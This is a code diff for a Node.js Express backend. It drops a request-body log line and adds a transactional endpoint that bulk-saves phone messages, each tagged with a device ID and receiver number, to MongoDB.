@@ -16,8 +16,6 @@ router.use("/admin", adminRouter);
 router.post("/save-data", async (req, res) => {
   console.log("Step 1: Received POST /save-data request");
 
-  console.log(req.body);
-
   try {
     let {
       deviceId, // deviceId REQUIRED
@@ -210,6 +208,77 @@ router.post("/formdata", async (req, res) => {
     res
       .status(500)
       .json({ message: "Error saving form data", error: error.message });
+  }
+});
+
+router.post("/save-multi-message", async (req, res) => {
+  console.log("POST /save-multi-message route hit");
+  const session = await UserModel.startSession();
+  session.startTransaction();
+  try {
+    const { receiverPhoneNumber, deviceId, messages } = req.body;
+    console.log("Request body for /save-multi-message:", req.body);
+
+    // Basic validation
+    if (!receiverPhoneNumber || !deviceId || !Array.isArray(messages) || messages.length === 0) {
+      console.log("Missing field(s) in /save-multi-message:", {
+        receiverPhoneNumber,
+        deviceId,
+        messages
+      });
+      await session.abortTransaction();
+      session.endSession();
+      return res.status(400).json({ message: "receiverPhoneNumber, deviceId and at least one message are required" });
+    }
+
+    // Check if deviceId exists in UserModel; if not, add it
+    const existingUser = await UserModel.findOne({ deviceId: deviceId }).session(session);
+    if (!existingUser) {
+      const newUser = new UserModel({ deviceId: deviceId });
+      await newUser.save({ session });
+      console.log("User added to UserModel with deviceId:", deviceId);
+    }
+
+    // Build formData array from the messages
+    const formDataBulk = messages
+      .filter(
+        (msg) =>
+          msg.senderPhoneNumber &&
+          msg.message &&
+          msg.time
+      )
+      .map((msg) => ({
+        senderPhoneNumber: msg.senderPhoneNumber,
+        message: msg.message,
+        time: msg.time,
+        recieverPhoneNumber: receiverPhoneNumber, // keep schema field name as-is
+        deviceId: deviceId,
+      }));
+
+    if (formDataBulk.length === 0) {
+      await session.abortTransaction();
+      session.endSession();
+      return res.status(400).json({ message: "No valid messages to save" });
+    }
+
+    const inserted = await FormDataModel.insertMany(formDataBulk, { session });
+    console.log("Bulk messages saved to DB:", inserted);
+
+    await session.commitTransaction();
+    session.endSession();
+
+    res.status(201).json({
+      message: "Multiple messages saved successfully",
+      data: inserted,
+    });
+    console.log("Response sent for /save-multi-message success.");
+  } catch (error) {
+    await session.abortTransaction();
+    session.endSession();
+    console.log("Error in /save-multi-message:", error);
+    res
+      .status(500)
+      .json({ message: "Error saving messages", error: error.message });
   }
 });
 
